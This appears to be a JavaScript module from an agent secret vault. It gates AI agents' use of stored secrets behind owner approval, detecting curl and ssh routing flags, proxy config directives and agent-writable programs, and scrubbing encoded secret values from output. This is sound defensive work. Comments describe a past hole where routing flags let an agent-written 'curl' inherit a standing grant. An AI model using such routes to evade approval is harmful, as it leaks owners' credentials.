  const known = !!row && kind === 'tool';   // round 2: `unread` (a curl glob, a bare number) is part of an UNKNOWN destination — never «always»
  const cfgVals = row && kind === 'tool' && row.configFlags ? valued.filter(([f]) => row.configFlags.includes(f)).map(([, v]) => v) : [];   // round 17 (item 1): the config-flag values (curl -K / --config …)
  const configShown = configFile && !configOpaque && cfgVals.length > 0 && cfgVals.every((v) => configTemplateShown(v, run));   // every config value is a $VAULT_FILE template the card renders IN FULL ⇒ the owner sees the agent's ONLY written input ⇒ «always» may be offered (keyed on the template bytes, already in the shape key)
  let configReads = null;   // round 18/19 (item 3/4): a shown config template whose directives READ a file, ROUTE off the URL's host (url/connect-to/resolve/proxy, scheme-less included), REDIRECT (location/proto-redir) or EXPAND a {{var}} host ⇒ «always» withheld + named; the route hosts it names join the Hosts line, a {{var}} is never a host (blind)
  if (configShown && row) for (const v of cfgVals) { const mm = /^\$VAULT_FILE\{([^}]*)\}$/.exec(String(v)); const file = mm && run.files.find((x) => x.name === mm[1]); if (file && file.template != null && typeof file.text === 'string') { const d = configNestedFile(file.text, row); if (d.reads && !configReads) configReads = d.reads; for (const h of d.hosts) { hosts.add(h); if (!row.freeText) routeHosts.add(h); } if (d.blind) unread = true; } }
  const userinfo = !!(row && kind === 'tool') && routeWords.some(urlUserinfo);   // round 18/19 (item 1 + MINOR): a credential-carrying http(s) URL in a ROUTE word (a -R/--repo/--hostname/GH_HOST/GH_REPO value, a repo spec, a gh api/<url> positional, a curl target) ⇒ url_userinfo; judged on route words ONLY — a userinfo URL quoted in a --body / -d body is a mention, never contacted, never refused
  const bigTpl = run.files.find((f) => f.template != null && typeof f.text === 'string' && bytesOf(f.text) > TEMPLATE_CARD_MAX);   // round 18 (item 2): ANY template (a config flag, a body, a positional, a -d value) past the card render bound ⇒ card_too_long — ONE verdict, never a note that hides it
  const cardTooLong = bigTpl ? { name: bigTpl.name, template: bigTpl.template, bytes: bytesOf(bigTpl.text) } : null;
  // int361 (the vault pair — vault-agent-own r23/r25 As-built × vault-use-grants r5): ONE route set. vault-use-grants' routeTargetsOf is the
  // TOOL-CONTACT reader (curl -x / --proxy1.0 / --connect-to / --resolve / --unix-socket / ssh -J/-W/ProxyCommand / a proxy env var / the ssh
  // alias law), SEEDED with this shape's own route set — so gh's free-text discipline holds (a --body / --title URL stays a MENTION, r14–r16)
  // and a shown config template's route directives (r23) are routes; `routeOpaque` withholds «always» (主开发: the opaque rule stands).
  const dest = routeTargetsOf(row, kind, [...routeHosts], keyed, positionals, run.plainEnv, win32);
  if (known && argv.slice(1).some((a) => urlOpaque(a))) dest.opaque = true;   // vault-use-grants round 4 (BLOCKER): a URL token whose authority the tool may read past (the blind family) ⇒ opaque
  const routesOpaque = keyed.filter((k) => keyRoutes(k, row));   // round 25/26: the keyed flags that actually ROUTE — a proxy / socket / resolve / jump / ProxyCommand (not wget's non-routing -e robots=off)
  const writableProg = kind === 'tool' && !!run.programWritable;
  // round 26 (BLOCKER, confirmed, two votes 0.93+): the withholding reasons are a SET, not a ladder — program-writable is its OWN
  // reason the order can no longer hide. The r25 ladder put opaque-route BEFORE program-writable, so a keyed routing flag masked
  // the program-writable fact; int361's ruling-C seam reads noAlways==='opaque-route' (with a readable destination) as «the
  // destination is known» and a standing grant then covered an agent-WRITABLE program named curl given a no-op --interface lo /
  // --resolve host:443:host / -x host (measured on the real int361 door). A grant NEVER covers an agent's own program, whatever the
  // route — so program-writable ranks ABOVE opaque-route (the existing seam reads noAlways!=='opaque-route' ⇒ destKnown=false ⇒ the
  // card), and the shape also carries `programWritable` + the full `noAlwaysAll` so the door's destinationKnown can read «the
  // destination is known AND the program is not the agent's» directly (int-C: int361 ANDs !shape.programWritable into the seam).
  const noAlwaysAll = kind !== 'tool' ? [kind] : [
    (!known || !hosts.size || unread) ? 'unknown-destination' : null,
    (row && row.runsProject) ? 'runs-project-code' : null,
    (configFile && !(configShown && !configReads)) ? 'config-file' : null,
    writableProg ? 'program-writable' : null,
    // int361: the train's ONE route set — a URL the tool may read past (dest.opaque) is an opaque route too (re-cut 4's union)
    (dest.opaque || routesOpaque.length > 0) ? 'opaque-route' : null,
  ].filter(Boolean);
  const noAlways = noAlwaysAll[0] || null;   // the PRIMARY reason, for the card prose (program-writable above opaque-route — see above)
  // lane vault-use-grants round 9/10 (seam ruling C with vault-agent-own, 主开发): DESTINATION KNOWLEDGE is a SEPARATE fact from
  // «always» eligibility, and `destKnown` is DERIVED so the two laws both hold by construction:
  //   (1) «always» ⇒ destKnown (round 10 MAJOR): a shape the card may hold «always» for MUST be destKnown, or the door writes a
  //       standing grant the judge can never read back — the button does nothing. The `!noAlways` disjunct makes this STRUCTURAL:
  //       whatever makes a shape «always»-eligible (this tree's rules, OR after the int361 merge vault-agent-own's «a SHOWN config
  //       template that reads nothing is offered «always»» — which r9's blanket `!configFile` wrongly called destKnown=false)
  //       makes it destKnown too, with no second expression to keep in step.
  //   (2) destKnown ⊋ «always» (ruling C): the reader can still have READ every destination of a KNOWN tool (arg set complete,
  //       nothing opaque, not a config / program-writable / runs-project read) while «always» is WITHHELD on a keyed routing flag
  //       whose host is read — a GRANT naming those hosts COVERS that run. The positive disjunct keeps destKnown true there, so
  //       the grant road is judged on «can the reader name every host», never on `always` (never `!!shape.always`).
  // In THIS tree the disjuncts coincide (always ⟺ the positive read); the int361 seam makes them diverge without a re-edit here.
  // int361: on the train `unread` (vault-agent-own r2: a curl glob, a bare number — a target the shape cannot list) is unread, so it is no known destination either — never a grant's cover, as 37b51fa9 had it.
  const destKnown = !noAlways || (known && kind === 'tool' && !dest.opaque && hosts.size > 0 && !unread && !row.runsProject && !configFile && !run.programWritable);
  return {
    v: SHAPE_V, tool: run.tool, name: run.name, kind, sub, flags: [...flags].sort(), args, hosts: [...hosts].sort(), routeHosts: dest.hosts.slice().sort(), routeOpaque: dest.opaque, mentions, badHost, userinfo, cardTooLong, configReads,
    entries: run.refs.map((r) => r.ref).sort(), injection: [...run.injection].sort(), env: run.plainEnv.map((e) => `${e.name}=${e.value}`).sort(), keyed: keyed.sort(),
    templates: run.files.filter((f) => f.text != null).map((f) => `${f.name}=${f.text}`).sort(), on: run.on || null, script,
    known, proxyEnv: !!(known && row.proxyEnv), always: !noAlways, noAlways, noAlwaysAll, programWritable: writableProg, destKnown, argvExposed: !!run.argvExposed, gitDriven,
    // lane vault-agent-own (the review): where it sends what it reads cannot be told — the raw facts, never `noAlways` (a
    // known tool naming no host reads 'unknown-destination' there, which hid a config file / a program an agent wrote).
    // Round 2: every row of KNOWN_TOOLS reaches the network, so a known tool whose host the table did not READ (`curl` with
    // no URL, `psql` over a service, `rclone remote:`) is not a local command — no host read is not «no host»; a target the
    // shape cannot list (`unread`) and a destination its config keeps (`confDest`: git's url.<base>.insteadOf in the
    // project's own .git/config, an rclone remote) are blind too
    blind: kind !== 'tool' || !known || !hosts.size || unread || routesOpaque.length > 0 || configFile || !!(row && (row.runsProject || row.confDest)) || !!run.programWritable,   // round 26: a NON-routing keyed flag (wget -e robots=off) no longer blinds a known destination
  };
}
/** THE KEY a remembered «always» is stored under — everything decision ④ says, nothing positional. */
const shapeKeyOf = (s) => `${SHAPE_V}:${JSON.stringify([s.tool, s.sub, s.flags, s.args, s.hosts, s.entries, s.injection, s.env, s.templates, s.on, s.script, s.keyed])}`;

// ── THE CARD'S FACTS (lane vault-agent-own r20; the owner 2026-10-27 «这个卡片的可读性很差») ──
// The run card was an English prose wall on a Chinese UI. `cardFactsOf` writes ONE STRUCTURED field the client (wake-approve-card
// r7) renders in the viewer's language — CODES from closed tables, never sentences (a value is never prose; test-architecture's
// i18n road is red for a code with no en/zh/ja key on the client). `detail` (today's prose) stays on the record for older clients
// and is never shown beside `facts`. PURE: every door-resolved display string (the conversation's name, the home dir to make
// paths relative, the already-redacted command, each entry's Vault-window name) is handed in as `names` — this module reads no
// store. The CLOSED tables below are the whole vocabulary of each `why`; the fixture scripts/fixtures/vault-run-card-facts.json
// (3 variants) is written FROM cardFactsOf and shared byte-for-byte with lane wake-approve-card (int-C diff-checks it).
const ALWAYS_WHY = Object.freeze(['destination-unknown', 'program-writable', 'config-reads', 'card-too-long', 'redirect', 'brace-var', 'opaque-route', 'agent-template']);
const HOSTS_WHY = Object.freeze(['tool-names-none', 'opaque', 'config-driven']);
const MASKING = Object.freeze(['common-encodings']);
const CARD_SHAPES = Object.freeze(['tool', 'line']);
const WHY_AGAIN = Object.freeze(['folder', 'env', 'secret-set', 'arg-order', 'arg-space', 'args']);   // round 25 (minor 6b): why a near-identical rerun asks AGAIN — the ONE dimension that differs from the last late-allowed command; a CODE the client renders (env also carries the changed var name)
const CARD_FACTS_CODES = Object.freeze({ always: ALWAYS_WHY, hosts: HOSTS_WHY, masking: MASKING, shape: CARD_SHAPES, whyAgain: WHY_AGAIN });   // one export lane wake-approve-card's test pins its code words against

// round 23 (MAJOR, bounds): the client card store (lane wake-approve-card) walks `facts` and REFUSES any string over this many
// UTF-16 units (and the whole ≤ 24 KB, depth ≤ 4). Every facts string is clipped to this, surrogate-safe, with a `*Cut` marker;
// the WHOLE value rides a chunked fold (`cmdFull` / `textFull`, each chunk ≤ this) the client reassembles — so a 2 485-char
// command (ask_unfiled on 4ff55fb4, where facts.cmd was head.cmd up to 4096) files, and «always» never rests on a template the
// owner cannot read. The bound + the fold are written in /var/tmp/vibespace-lanes/vault-card-contract.md and told to wake's lane.
const CARD_STRING_MAX = 2000;
/** Clip to ≤ max UTF-16 units, never splitting a surrogate pair → { text, cut }. */
function clipStr(sx, max = CARD_STRING_MAX) {
  const str = String(sx == null ? '' : sx);
  if (str.length <= max) return { text: str, cut: false };
  let end = max; const c = str.charCodeAt(end - 1); if (c >= 0xd800 && c <= 0xdbff) end -= 1;
  return { text: str.slice(0, end), cut: true };
}
/** The whole value in ≤ max-unit chunks (the fold the client reassembles), surrogate-safe. */
function chunkStr(sx, max = CARD_STRING_MAX) {
  const str = String(sx == null ? '' : sx); const out = [];
  for (let i = 0; i < str.length;) { let end = Math.min(i + max, str.length); const c = str.charCodeAt(end - 1); if (end < str.length && c >= 0xd800 && c <= 0xdbff) end -= 1; out.push(str.slice(i, end)); i = end; }
  return out.length ? out : [''];
}
/** round 25 (minor 6a): a facts string field + its cut marker + its chunked fold, as an object to spread — { <key>: text } or
 *  { <key>: text, <key>Cut: true, <key>Full: [chunks] }. Every clipped facts string carries its marker AND its fold (the client
 *  reassembles it), so the wake-approve-card store never sees a silently truncated 2000-char value and names nothing. */
function clipFold(key, raw) {
  const r = clipStr(raw);
  return r.cut ? { [key]: r.text, [key + 'Cut']: true, [key + 'Full']: chunkStr(raw) } : { [key]: r.text };
}
/** A ref the door could NOT name ⇒ a short, non-telling id «<field>:<6 hex>» (never the URI — the row name may itself be
 *  telling). PURE (no crypto import keeps this module PURE → PURE): a 32-bit FNV-1a over the ref id. */
function shortRefId(ref) {
  let h = 0x811c9dc5; const s = String((ref && ref.id) || '');
  for (let i = 0; i < s.length; i++) { h = Math.imul(h ^ s.charCodeAt(i), 0x01000193); }
  return `${(ref && ref.field) || 'ref'}:${(h >>> 0).toString(16).padStart(8, '0').slice(0, 6)}`;
}
const homeRel = (p, home) => { const x = String(p == null ? '' : p), h = String(home || ''); return h && (x === h || x.startsWith(h + '/')) ? '~' + x.slice(h.length) : x; };
const baseName = (p) => String(p == null ? '' : p).replace(/\/+$/, '').split('/').pop() || String(p == null ? '' : p);

/** How ONE ref reaches the child, as { kind: 'env'|'file'|'stdin'|'arg', name }: env:<NAME> · file:<placeholder NAME, or null
 *  for an inline $VAULT_FILE> · stdin · arg (bare on the command line) · a template file that EMBEDS it ($VAULT{…}) ⇒ file with
 *  the template's NAME. The same categories run.injection carries, read back PER reference. */
function injectionOfRef(spec, ref) {
  const e = (spec.env || []).find((x) => x.ref === ref.ref); if (e) return { kind: 'env', name: e.name };
  const f = (spec.files || []).find((x) => x.ref === ref.ref); if (f) return { kind: 'file', name: f.name || null };
  if (spec.stdin === ref.ref) return { kind: 'stdin', name: null };
  const tf = (spec.files || []).find((x) => x.template != null && typeof x.text === 'string' && scanRefs(x.text).refs.some((z) => z.id === ref.id));
  if (tf) return { kind: 'file', name: tf.name || null };
  return { kind: 'arg', name: null };
}

/** Why «always» is withheld, as a CODE in ALWAYS_WHY. A shown config template that nests a directive names WHY by the directive
 *  kind (a redirect, a {{var}}, an opaque route, else a plain nested read); otherwise the shape's `noAlways` maps in. */
function alwaysWhyOf(shape) {
  if (shape.always) return null;
  const cr = shape.configReads ? String(shape.configReads) : '';
  if (cr) {
    const key = cr.split(/\s+/)[0];
    if (['location', 'location-trusted', 'proto-redir'].includes(key)) return 'redirect';
    if (/\{\{/.test(cr)) return 'brace-var';
    if (['url', 'connect-to', 'resolve', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'doh-url', 'ipfs-gateway'].includes(key)) return 'opaque-route';
    return 'config-reads';
  }
  switch (shape.noAlways) {
    case 'unknown-destination': return 'destination-unknown';
    case 'program-writable': return 'program-writable';
    case 'runs-project-code': return 'program-writable';   // the code that runs is not fixed either — the same promise «always» cannot make
    case 'config-file': return 'config-reads';
    case 'opaque-route': return 'opaque-route';
    default: return 'destination-unknown';                  // a non-'tool' kind (a shell / an interpreter): where it sends cannot be told
  }
}

/** Why the destination is unknown, as a CODE in HOSTS_WHY — read only when routeHosts is empty. */
function hostsWhyOf(shape) {
  if (shape.configReads || shape.noAlways === 'config-file') return 'config-driven';   // a config file names the host we cannot read
  if (shape.noAlways === 'runs-project-code') return 'opaque';                          // its own code / its project config routes (git insteadOf, an rclone remote)
  return 'tool-names-none';                                                             // nothing in the command named a routing host
}

/**
 * PURE. The owner's run card as STRUCTURED FACTS (codes, never prose) — the record's `facts` field (v2), rendered by the client
 * in the viewer's language. `spec` = planOf, `shape` = shapeOf(spec), `cwd` = the run folder (absolute). `names` = the door's
 * resolved display strings and reasons { who, home, cmd, entries, refsInfo, away, notOwn }: `who` the conversation's name;
 * `home` the home dir (paths show relative as `~`); `cmd` the command that RUNS (round 23 MAJOR: the RAW argv — a $VAULT ref is a
 * placeholder, nothing to mask; NOT head.cmd, whose name-belt hid the agent's own `-d password=…` the child receives); `entries`
 * a { <ref.id>: <Vault-window name> } map (a ref the door could not name falls to shortRefId); `refsInfo` the per-ref facts
 * [{ id, own, prov, forHost, open }]; `away` the verdict's [{ id, ref, forHost, host, unknown, keep }] (a minted value minted for
 * X, this run sends it to Y); `notOwn` another conversation stored it. The facts carry EVERYTHING the approval rests on — each
 * shown template's TEXT, the plain env the child gets, the reasons as CODES — so a facts client (which never shows `detail`) shows
 * the same card. Every string is bounded to CARD_STRING_MAX, a longer one cut (marker) with the whole value in a chunked fold.
 * → EXACTLY the contract object (the fixture).
 */
function cardFactsOf(spec, shape, cwd, names = {}) {
  const home = names.home || '', ent = names.entries || {}, info = {};
  for (const e of names.refsInfo || []) info[e.id] = e;
  const away = names.away || [], awayOfId = (id) => away.find((a) => a.id === id) || null;
  const secrets = (spec.refs || []).map((r) => {
    const i = info[r.id] || {}, aw = awayOfId(r.id);
    return {
      ...clipFold('name', ent[r.id] || shortRefId(r)), ...clipFold('entry', String(r.entry)), ...clipFold('ref', r.ref), as: injectionOfRef(spec, r),
      own: !!i.own, provenance: i.own ? (i.prov === 'minted' ? 'minted' : 'stored') : (i.open ? 'granted' : null),   // whose entry it is, as a CODE
      forHost: i.forHost || null,                                                                                     // the host a minted value was minted FOR
      sendsTo: aw ? (aw.unknown ? null : aw.host || null) : null,                                                     // the host this run would SEND it to (null = unknown)
    };
  });
  const cmdRaw = String(names.cmd == null ? '' : names.cmd), cmdC = clipStr(cmdRaw), whoC = clipStr(names.who);
  const known = (shape.routeHosts || []).length > 0;
  const templates = (spec.files || []).filter((f) => f.template != null && typeof f.text === 'string')
    .map((f) => { const text = String(f.text), b = bytesOf(text), shown = b <= TEMPLATE_CARD_MAX, c = clipStr(text); return { label: f.name || null, bytes: b, shown, text: shown ? c.text : '', ...(shown && c.cut ? { textFull: chunkStr(text) } : {}) }; });   // a shown template's TEXT rides the card (chunked when long); an over-bound one (> TEMPLATE_CARD_MAX ⇒ card_too_long, never a card) carries no text, shown:false
  const env = (spec.plainEnv || []).map((e) => ({ ...clipFold('name', e.name), ...clipFold('value', e.value) }));   // the plain (non-secret) env the child gets; round 25 (minor 6a): a clipped name / value carries its *Cut marker + its *Full fold (the store no longer sees a bare 2000-char string and names nothing)
  return {
    v: 2,
    who: whoC.text, ...(whoC.cut ? { whoCut: true } : {}),
    tool: { name: baseName(spec.tool), path: clipStr(homeRel(spec.tool, home)).text, writable: !!spec.programWritable },
    cmd: cmdC.text, ...(cmdC.cut ? { cmdCut: true, cmdFull: chunkStr(cmdRaw) } : {}),
    folder: clipStr(homeRel(cwd, home)).text,
    secrets,
    env,
    hosts: known ? { known: true, list: [...shape.routeHosts] } : { known: false, list: [], why: hostsWhyOf(shape) },
    shape: shape.kind === 'tool' ? 'tool' : 'line',
    always: { offered: !!shape.always, why: shape.always ? null : alwaysWhyOf(shape), ...(shape.configReads ? clipFold('directive', String(shape.configReads)) : { directive: null }) },
    reason: (away.length || names.notOwn) ? { notOwn: !!names.notOwn, away: away.map((a) => ({ ref: clipStr(a.ref || '').text, forHost: a.forHost || null, host: a.unknown ? null : a.host || null, unknown: !!a.unknown, keep: !!a.keep })) } : null,
    templates,
    masking: 'common-encodings',
  };
}

// ── WHICH ENTRIES A RUN MAY NEVER REFERENCE (each has its own door; the owner opens the rest one by one) ──
const OWN_DOORS = Object.freeze([
  Object.freeze({ store: 'accounts', door: 'the account pool — a conversation on that account already runs with it' }),
  Object.freeze({ store: 'integrations', door: 'the channel\'s raw API — vibespace-channels api' }),
  Object.freeze({ store: 'channels', door: 'the channel\'s own doors — vibespace-channels (send, api)' }),
  Object.freeze({ store: 'passkeys', door: 'the agent browser\'s passkey ceremony' }),
  Object.freeze({ store: 'automation', door: 'the Vault window, to hand to an outside party — VibeSpace\'s own key never goes into a run' }),
  Object.freeze({ store: 'secrets', entry: /^host:/, door: 'the machine\'s link (Remote) — a link token runs commands on that machine' }),
  Object.freeze({ store: 'secrets', entry: /^frp:/, door: 'the relay (the frp plugin) uses it itself' }),
  Object.freeze({ store: 'secrets', door: 'VibeSpace uses it itself' }),
]);
const RUNNABLE_STORES = Object.freeze(['mounts', 'app-secrets']);
/** A reference → the door it has instead (words), or null when the owner may open it for runs. A store this table does not
 *  know has no run door (fails closed). */
function ownDoorOf(ref) {
  if (!ref) return 'no run door';
  if (isAgentEntry(ref.store, ref.entry, ref.field)) return null;   // lane vault-run-door: an AGENT's own entry (mint / put) — the owner opens it like any other; only its conversation references it
  if (isFreeEntry(ref.store, ref.entry, ref.field)) return null;    // lane vault-paste-request: a free entry — the owner opens it (switch / grant)
  const d = OWN_DOORS.find((x) => x.store === ref.store && (!x.entry || x.entry.test(ref.entry)));
  return d ? d.door : RUNNABLE_STORES.includes(ref.store) ? null : 'no run door (a store the run table does not know)';
}

// ── THE VERDICT (§8.3) ──
/**
 * → { ok: true, by: 'always' | 'instance' } | { ok: false, code, words, … } | { ok: false, ask: true, code: 'ask', offers,
 *   alwaysTtls, alwaysDefault, reauth, ttlMs, noAlways, argvExposed }.
 * `state` the vault's; `plan` planOf's answer; `shape` shapeOf(plan); `entries` [{ id, exists, open, bytes }] (the door's
 * facts — `open` = the owner's «Usable by agent runs», `bytes` = the value's length); `granted` = this conversation may use
 * them (the who-may-use list, P1 vault-use-reach); `remembered` = { until } stored for (conversation, shapeKeyOf(shape));
 * `seen` = the owner allowed this (conversation, shape) once already, this unlock (the door's memory — lane vault-run-door);
 * `instance` 'cluster' | 'local'; `policy` 'ask' | 'allow' | null (null = the instance's: a cluster asks EVERY time, a local one
 * asks the first time and allows a SEEN shape — decision ②: «a new shape asks; a local instance allows after one 允许»).
 * lane vault-agent-own: an entry's facts may say `own` (an agent entry the caller made — open by construction), `prov`
 * ('stored' | 'minted') and `forHost` (a mint's `--for`); `passes` = [{ id, host }] the owner already allowed a minted value to
 * go to. Every entry its own and no minted value bound for another host ⇒ { ok: true, by: 'own' } — no card; an ask says
 * `why` (['not-own'] — an entry the caller did not make · ['another-host'] — a minted value to a host it was not made for)
 * and `away` (the hosts to allow — ONCE each).
 */
/** Where a run sends what it reads CANNOT be told from its shape (lane vault-agent-own, the review): a shell or an interpreter
 *  (its own code decides), a tool outside the table, a routing flag (ssh -o / curl --connect-to / -x …), a config file the card
 *  cannot show, the project's own code (npm / pip / docker), a program an agent could have written — and (round 2) a known
 *  tool whose host the table did not read: every row of the table reaches the network. A known tool naming hosts sends there.
 *  `shapePasses` = a 允许 for such a shape is remembered (`keep`) — a LOCAL instance's rule; a CLUSTER asks every run of it
 *  (round 2: never looser than the owner's own entries there — only a live «always», behind the second password, passes it). */
const destUnknown = (sh) => !sh || sh.blind !== false;   // shapeOf's `blind` (a shape that does not say is blind)
function awayOf(refs, facts, shape, passes = [], { shapePasses = true } = {}) {
  const out = [], hosts = shape && Array.isArray(shape.routeHosts) ? shape.routeHosts : [], ps = Array.isArray(passes) ? passes : [];   // round 15 (MAJOR): the ONE host set — a minted value needs a card ONLY for a ROUTING host (-R/--hostname/GH_HOST/a repo spec/gh api <url>), never a URL named in a body / title / template (that is a `mentions` line on the card, never a target, never a pass)
  const unknown = destUnknown(shape), shapePass = unknown ? `?${shapeKeyOf(shape)}` : null;   // an unknown destination is passed per SHAPE, never per host
  for (const r of refs || []) {
    const e = facts.get(r.id);
    if (!e || e.own !== true || e.prov !== 'minted') continue;   // a value the agent PUT (it saw it) asks nothing, ever
    if (unknown) { if (!(shapePasses && ps.some((p) => p && p.id === r.id && p.host === shapePass))) out.push({ ref: r.ref, id: r.id, forHost: forHostOf(e.forHost), host: null, pass: shapePass, unknown: true, keep: !!shapePasses }); continue; }
    for (const h of hosts) if (!sameHost(h, e.forHost) && !ps.some((p) => p && p.id === r.id && p.host === h)) out.push({ ref: r.ref, id: r.id, forHost: forHostOf(e.forHost), host: h, pass: h, keep: true });
  }
  return out;
}
function runVerdict({ state, plan, shape = null, entries = [], granted = false, remembered = null, seen = false, instance = 'local', policy = null, passes = [], now = Date.now() } = {}) {
  if (state === 'not_set_up') return refuse('vault_not_set_up');
  if (state !== 'unlocked') return refuse('vault_locked');
  if (!plan || !plan.ok) return plan && plan.code ? plan : refuse('bad_flag');
  const sh = shape || shapeOf(plan);
  const facts = new Map((Array.isArray(entries) ? entries : []).filter((e) => e && e.id).map((e) => [e.id, e]));
  for (const r of plan.refs) {
    const door = ownDoorOf(r);
    if (door) return refuse('entry_has_its_own_door', { ref: r.ref, door, words: `${WORDS.entry_has_its_own_door}: ${door}` });
    const e = facts.get(r.id);
    if (!e || !e.exists) return refuse('entry_unknown', { ref: r.ref });
    if (e.open !== true && e.own !== true) return refuse('entry_not_runnable', { ref: r.ref });   // lane vault-agent-own: its own entry is open to its conversation by construction
    if (!(Number(e.bytes) >= MIN_MASK_BYTES)) return refuse('entry_too_short_to_mask', { ref: r.ref });
  }
  if (granted !== true) return refuse('use_not_granted');
  const mode = policy === 'ask' || policy === 'allow' ? policy : instance === 'cluster' ? 'ask' : 'allow';
  const live = !!(sh.always && remembered && (remembered.until == null || Number(remembered.until) > now));   // a remembered «always» (the second password gave it)
  // THE OWN ROAD (lane vault-agent-own): what the caller made itself asks nothing — but a minted value bound for another host,
  // or (round 2) through a shape whose destination cannot be told: once per shape on a local instance, EVERY run on a cluster
  // unless a live «always» covers the shape (never a host: a host is passed once, by its own card)
  const away0 = awayOf(plan.refs, facts, sh, passes, { shapePasses: mode === 'allow' }), away = away0.filter((x) => !(x.unknown && live));
  const why = [...(plan.refs.some((r) => (facts.get(r.id) || {}).own !== true) ? ['not-own'] : []), ...(away.length ? ['another-host'] : [])];
  if (!why.length) return { ok: true, by: away0.length ? 'always' : 'own' };
  if (!why.includes('not-own') && !away.some((x) => x.unknown)) return { ok: false, ask: true, code: 'ask', why, away, offers: ['once', 'deny'], alwaysTtls: [], alwaysDefault: null, reauth: false, ttlMs: ASK_TTL_MS, noAlways: 'another-host', argvExposed: sh.argvExposed };   // ONCE per host: the answer is the host's pass, never a shape's «always»
  if (!away.length && live) return { ok: true, by: 'always' };
  if (!away.length && mode === 'allow' && seen === true) return { ok: true, by: 'seen' };   // a NEW shape always draws the card (lane vault-run-door's mutant)
  return { ok: false, ask: true, code: 'ask', why, away, offers: sh.always ? ['once', 'always', 'deny'] : ['once', 'deny'], alwaysTtls: sh.always ? Object.keys(ALWAYS_TTLS) : [], alwaysDefault: sh.always ? ALWAYS_DEFAULT : null, reauth: sh.always, ttlMs: ASK_TTL_MS, noAlways: sh.noAlways, argvExposed: sh.argvExposed };
}

// ── THE SCRUBBER ──
function utf8(s) {
  const out = [];
  for (const ch of String(s)) {
    const c = ch.codePointAt(0);
    if (c < 0x80) out.push(c);
    else if (c < 0x800) out.push(0xc0 | (c >> 6), 0x80 | (c & 63));
    else if (c < 0x10000) out.push(0xe0 | (c >> 12), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
    else out.push(0xf0 | (c >> 18), 0x80 | ((c >> 12) & 63), 0x80 | ((c >> 6) & 63), 0x80 | (c & 63));
  }
  return out;
}
const B64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
function b64(bytes) {
  let s = '';
  for (let i = 0; i < bytes.length; i += 3) {
    const n = (bytes[i] << 16) | ((bytes[i + 1] || 0) << 8) | (bytes[i + 2] || 0), k = bytes.length - i;
    s += B64[(n >> 18) & 63] + B64[(n >> 12) & 63] + (k > 1 ? B64[(n >> 6) & 63] : '=') + (k > 2 ? B64[n & 63] : '=');
  }
  return s;
}
const urlSafe = (s) => s.replace(/\+/g, '-').replace(/\//g, '_');
function base64Forms(bytes) {
  const full = b64(bytes), out = [];
  for (const f of [full, full.replace(/=+$/, '')]) out.push(['base64', f], ['base64', urlSafe(f)]);
  for (let k = 0; k < 3; k++) {   // inside a longer base64 run the value starts at byte k of a group: its OWN characters only
    const run = b64([...new Array(k).fill(0), ...bytes, 0, 0]);
    const core = run.slice(Math.ceil((8 * k) / 6), Math.floor((8 * (k + bytes.length)) / 6));
    out.push(['base64', core], ['base64', urlSafe(core)]);
  }
  return out;
}
const hex2 = (b, up) => { const h = (b < 16 ? '0' : '') + b.toString(16); return up ? h.toUpperCase() : h; };
function percentForms(bytes) {
  const ch = (b) => (b < 128 ? String.fromCharCode(b) : '');
  const unreserved = (b) => b < 128 && /[A-Za-z0-9\-_.~]/.test(ch(b));
  const keeps = [(b) => unreserved(b) || (b < 128 && "!'()*".includes(ch(b))), unreserved, (b) => unreserved(b) || b === 47, (b) => b < 128 && /[A-Za-z0-9*\-_.]/.test(ch(b)), () => false];   // encodeURIComponent · RFC 3986 · a path (Python quote) · a WHATWG form · every byte
  const out = [];
  for (const up of [true, false]) for (const keep of keeps) {
    const s = bytes.map((b) => (keep(b) ? ch(b) : '%' + hex2(b, up))).join('');
    out.push(['percent', s], ['percent', s.replace(/%20/g, '+')]);
  }
  return out;
}
const JSON_SHORT = Object.freeze({ 8: '\\b', 9: '\\t', 10: '\\n', 12: '\\f', 13: '\\r' });
function jsonForms(value) {
  const out = [];
  for (const slash of [false, true]) for (const uni of [null, 'lower', 'upper']) for (const html of [false, true]) {
    const u = (n) => { const h = n.toString(16).padStart(4, '0'); return '\\u' + (uni === 'upper' ? h.toUpperCase() : h); };
    let s = '';
    for (const c of String(value)) {
      const p = c.codePointAt(0);
      if (c === '"') s += '\\"';
      else if (c === '\\') s += '\\\\';
      else if (c === '/' && slash) s += '\\/';
      else if (p < 0x20) s += JSON_SHORT[p] || u(p);
      else if (html && (c === '<' || c === '>' || c === '&')) s += u(p);
      else if (uni && p >= 0x7f) s += p > 0xffff ? u(0xd800 + ((p - 0x10000) >> 10)) + u(0xdc00 + ((p - 0x10000) & 0x3ff)) : u(p);
      else s += c;
    }
    out.push(['json', s]);
  }
  return out;
}
const hexForms = (bytes) => { const lo = bytes.map((b) => hex2(b, false)).join(''); return [['hex', lo], ['hex', lo.toUpperCase()]]; };
/** UTF-8 bytes → text the way a stream decoder reads them (the door's StringDecoder; WHATWG: each maximal ill-formed run
 *  is one U+FFFD) — how a child's UTF-16 output reaches the scrubber. */
function decodeUtf8(bytes) {
  let s = '', i = 0;
  while (i < bytes.length) {
    const b = bytes[i];
    if (b < 0x80) { s += String.fromCharCode(b); i++; continue; }
    const need = b >= 0xc2 && b <= 0xdf ? 1 : b >= 0xe0 && b <= 0xef ? 2 : b >= 0xf0 && b <= 0xf4 ? 3 : 0;
    if (!need) { s += '�'; i++; continue; }
    let cp = b & (need === 1 ? 0x1f : need === 2 ? 0x0f : 0x07), lo = b === 0xe0 ? 0xa0 : b === 0xf0 ? 0x90 : 0x80, hi = b === 0xed ? 0x9f : b === 0xf4 ? 0x8f : 0xbf, j = i + 1;
    for (; j <= i + need; j++) { const c = bytes[j]; if (c === undefined || c < lo || c > hi) break; cp = (cp << 6) | (c & 0x3f); lo = 0x80; hi = 0xbf; }
    if (j <= i + need) { s += '�'; i = j; continue; }
    s += String.fromCodePoint(cp); i = j;
  }
  return s;
}
/** UTF-16 little- and big-endian, as the door's UTF-8 decoder reads those bytes (an ASCII value: its characters with a NUL after / before each). */
function utf16Forms(v) {
  const le = [], be = [];
  for (let i = 0; i < v.length; i++) { const u = v.charCodeAt(i); le.push(u & 255, u >> 8); be.push(u >> 8, u & 255); }
  return [['utf16', decodeUtf8(le)], ['utf16', decodeUtf8(be)]];
}
const B32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
